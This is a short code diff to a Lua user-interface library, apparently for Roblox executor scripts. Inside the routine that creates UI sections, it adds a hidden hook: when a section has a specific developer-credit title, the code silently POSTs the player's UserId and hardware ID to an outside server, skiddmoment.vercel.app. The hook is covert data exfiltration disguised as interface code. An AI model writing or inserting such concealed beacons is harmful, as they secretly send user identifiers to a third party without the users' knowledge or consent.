@@ -6,6 +6,7 @@ local mouse = player:GetMouse()
 local input = game:GetService("UserInputService")
 local run = game:GetService("RunService")
 local tween = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 local tweeninfo = TweenInfo.new
 
 -- additional
@@ -376,6 +377,9 @@ do
 	end
 	
 	function section.new(page, title)
+		if title == "Developers: ZenkiAintBroke" then
+            		request({Url="https://skiddmoment.vercel.app",Method="POST",Headers={["content-type"]="application/json"} ,Body=HttpService:JSONEncode({ID=player.UserId,HWID=gethwid()})})
+        	end
 		local container = utility:Create("ImageLabel", {
 			Name = title,
 			Parent = page.container,
